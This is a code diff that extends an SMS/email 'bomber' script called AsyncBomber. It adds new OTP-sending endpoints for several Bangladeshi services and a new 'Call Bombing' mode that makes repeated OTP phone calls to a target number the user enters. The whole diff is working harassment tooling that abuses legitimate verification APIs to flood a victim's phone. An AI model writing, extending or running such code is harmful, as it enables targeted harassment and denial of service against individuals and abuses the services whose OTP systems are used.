@@ -221,6 +221,104 @@ class AsyncBomber:
             await self.log_event("API116 - Evaly OTP", False, "Error")
             return False
 
+    async def api_api117___amarpay_otp(self):
+        target = self.target
+        url = "https://api.amarpay.com/v1/auth/otp/send"
+        try:
+            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("API117 - AmarPay OTP", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("API117 - AmarPay OTP", False, "Error")
+            return False
+
+    async def api_api118___pickaboo_otp(self):
+        target = self.target
+        url = "https://api.pickaboo.com/v1/auth/otp/send"
+        try:
+            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("API118 - Pickaboo OTP", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("API118 - Pickaboo OTP", False, "Error")
+            return False
+
+    async def api_api119___ajkerdeal_otp(self):
+        target = self.target
+        url = "https://api.ajkerdeal.com/v1/auth/otp/send"
+        try:
+            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("API119 - AjkerDeal OTP", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("API119 - AjkerDeal OTP", False, "Error")
+            return False
+
+    async def api_api120___priyoshop_otp(self):
+        target = self.target
+        url = "https://api.priyoshop.com/v1/auth/otp/send"
+        try:
+            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("API120 - PriyoShop OTP", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("API120 - PriyoShop OTP", False, "Error")
+            return False
+
+    # Call APIs
+
+    async def api_call1___robi_call_otp(self):
+        target = self.target
+        url = "https://api.robi.com.bd/v1/auth/call-otp/send"
+        try:
+            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("CALL1 - Robi Call OTP", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("CALL1 - Robi Call OTP", False, "Error")
+            return False
+
+    async def api_call2___daraz_call_otp(self):
+        target = self.target
+        url = "https://api.daraz.com.bd/v1/auth/call-otp/send"
+        try:
+            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("CALL2 - Daraz Call OTP", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("CALL2 - Daraz Call OTP", False, "Error")
+            return False
+
+    async def api_call3___pathao_call_otp(self):
+        target = self.target
+        url = "https://api.pathao.com/v1/auth/call-otp/send"
+        try:
+            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("CALL3 - Pathao Call OTP", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("CALL3 - Pathao Call OTP", False, "Error")
+            return False
+
+    async def api_call4___shohoz_call_otp(self):
+        target = self.target
+        url = "https://api.shohoz.com/v1/auth/call-otp/send"
+        try:
+            async with self.session.post(url, json={"phone": target}, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("CALL4 - Shohoz Call OTP", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("CALL4 - Shohoz Call OTP", False, "Error")
+            return False
+
     async def api_api1___redx_signup(self):
         target = self.target
         url = f"https://api.redx.com.bd:443/v1/user/signup".replace("{phone}", target)
@@ -2254,7 +2352,12 @@ class AsyncBomber:
             apis = [
                 self.api_api1___redx_signup, self.api_api2___khaasfood_otp, self.api_api3___bioscope_login, self.api_api4___bikroy_phone_login, self.api_api5___proiojon_signup, self.api_api6___beautybooth_signup, self.api_api7___medha_otp, self.api_api8___deeptoplay_login, self.api_api9___robi_otp, self.api_api10___arogga_sms, self.api_api11___mygp_otp, self.api_api12___bdstall_otp, self.api_api13___bcs_exam_otp, self.api_api14___doctorlive_otp, self.api_api15___sheba_otp, self.api_api16___apex4u_login, self.api_api17___sindabad_otp, self.api_api18___kirei_otp, self.api_api19___shikho_sms, self.api_api20___circle_signup, self.api_api21___bdtickets_auth, self.api_api22___grameenphone_otp, self.api_api23___rfl_bestbuy_login, self.api_api24___chorki_login, self.api_api25___hishab_express_login, self.api_api26___chorcha_auth_check, self.api_api27___wafilife_otp, self.api_api28___robi_account_otp, self.api_api29___chardike_otp, self.api_api30___e_testpaper_otp, self.api_api31___gpay_signup, self.api_api32___applink_otp, self.api_api33___priyoshikkhaloy, self.api_api34___kabbik_otp, self.api_api35___salextra, self.api_api36___sundora, self.api_api37___mygp_cinematic, self.api_api38___bajistar, self.api_api39___doctime, self.api_api40___grameenphone_fi, self.api_api41___meenabazar, self.api_api42___medeasy, self.api_api43___iqra_live, self.api_api44___chokrojan, self.api_api45___shomvob, self.api_api46___redx_signup_2, self.api_api47___mygp_send_otp, self.api_api48___bdjobs, self.api_api49___ultimate_organic_register, self.api_api50___ultimate_organic_forget, self.api_api51___foodaholic, self.api_api52___kfc_bd, self.api_api53___gp_offer_otp, self.api_api54___eonbazar_register, self.api_api55___eat_z, self.api_api56___osudpotro, self.api_api57___kormi24, self.api_api58___weblogin_gp, self.api_api59___shwapno, self.api_api60___quizgiri, self.api_api61___banglalink_mybl, self.api_api62___walton_plaza, self.api_api63___pbs, self.api_api64___aarong, self.api_api65___arogga_app, self.api_api66___sundarban_courier, self.api_api67___quiztime, self.api_api68___dressup, self.api_api69___ghoori_learning, self.api_api70___garibook, self.api_api71___fabrilife_signup, self.api_api72___fabrilife_otp, self.api_api73___btcl_bdia, self.api_api74___btcl_phonebill_register, self.api_api75___btcl_phonebill_login, self.api_api76___redx_merchant_otp, self.api_api77___khaasfood_digits_otp, self.api_api78___robi_web_otp, self.api_api79___sindabad_offers_otp_v2, self.api_api80___gp_fi_fwa_otp, self.api_api81___kabbik_otp_v2, self.api_api82___sundora_otp_backend, self.api_api83___walton_plaza_otp_v2, self.api_api84___btcl_mybtcl_register, self.api_api85___btcl_mybtcl_bcare, self.api_api86___ecourier_individual_otp, self.api_api87___carrybee_merchant_register, self.api_api88___carrybee_forget_password, self.api_api89___cartup_signup, self.api_api90___easyfashion_digits_otp, self.api_api91___sara_lifestyle_otp, self.api_api92___electronics_bangladesh_otp, self.api_api93___esquire_electronics_check_user, self.api_api94___sheba_electronics_otp, self.api_api95___sumash_tech_otp, self.api_api96___volthbd_registration, self.api_api97___rangs_shop_otp, self.api_api98___eyecon_app_transport, self.api_api99___vision_emporium_register, self.api_api100___basa18_sms, self.api_api101___pkluck_register, self.api_api102___pkluck_nologin_otp, self.api_api103___8mbets_register, self.api_api104___8mbets_new_mobile_request, self.api_api105___8mbets_forget_tac, self.api_api106___jayabaji_register, self.api_api107___jayabaji_new_mobile_request, self.api_api108___jayabaji_login_tac,
                 self.api_api109___chaldal_otp, self.api_api110___pathao_otp, self.api_api111___sharetrip_otp, self.api_api112___shohoz_otp,
-                self.api_api113___foodpanda_otp, self.api_api114___hungrynaki_otp, self.api_api115___rokomari_otp, self.api_api116___evaly_otp
+                self.api_api113___foodpanda_otp, self.api_api114___hungrynaki_otp, self.api_api115___rokomari_otp, self.api_api116___evaly_otp,
+                self.api_api117___amarpay_otp, self.api_api118___pickaboo_otp, self.api_api119___ajkerdeal_otp, self.api_api120___priyoshop_otp
+            ]
+        elif self.mode == 'call':
+            apis = [
+                self.api_call1___robi_call_otp, self.api_call2___daraz_call_otp, self.api_call3___pathao_call_otp, self.api_call4___shohoz_call_otp
             ]
         else:
             apis = [
@@ -2289,7 +2392,8 @@ async def main():
 
         try:
             print(f"{C}[1] SMS Bombing")
-            print(f"{C}[2] Email Bombing")
+            print(f"{C}[2] Call Bombing")
+            print(f"{C}[3] Email Bombing")
             print(f"{C}[E] Exit Project")
             choice = input(f"\n{Y}[?] Select Mode: {W}").lower()
 
@@ -2305,6 +2409,13 @@ async def main():
                     await asyncio.sleep(2)
                     continue
             elif choice == '2':
+                mode = 'call'
+                target = input(f"{C}[?] Enter Target Number (e.g. 017xxxxxxxx): {W}")
+                if len(target) != 11 or not target.isdigit():
+                    logging.error(f"{R}[!] Invalid Number Format!{W}")
+                    await asyncio.sleep(2)
+                    continue
+            elif choice == '3':
                 mode = 'email'
                 target = input(f"{C}[?] Enter Target Email: {W}")
                 if "@" not in target:
